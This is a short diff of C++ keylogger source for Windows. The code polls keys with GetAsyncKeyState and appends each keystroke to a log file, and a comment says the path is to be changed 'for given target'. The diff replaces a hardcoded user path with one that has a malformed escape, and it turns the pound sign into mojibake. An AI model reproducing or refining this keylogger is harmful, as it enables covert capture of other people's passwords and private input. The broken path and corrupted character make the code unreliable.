@@ -32,7 +32,7 @@ void log()
 		{
 			if (GetAsyncKeyState(Key) == -32767)
 			{   //writes the data to the given path. needs to be changed for given target.
-				ofstream write("C:\\Users\\amand_000\\Documents\\Visual Studio 2015\\Projects\\Project1\\Record.txt", ios::app);
+				ofstream write("C:\Visual Studio 2015\\Projects\\Project1\\Record.txt", ios::app);
 
 				//checks if shift key is pressed.
 				if (((Key > 64)) && (Key < 91) && !(GetAsyncKeyState(0x10)))//check if the shift key is not pressed.
@@ -85,7 +85,7 @@ void log()
 						case 51:
 						{
 							if (GetAsyncKeyState(0x10))//is shift being pressed?
-							write << "£";//yes.
+							write << "Â£";//yes.
 							else
 							write << "3";//no.
 						}
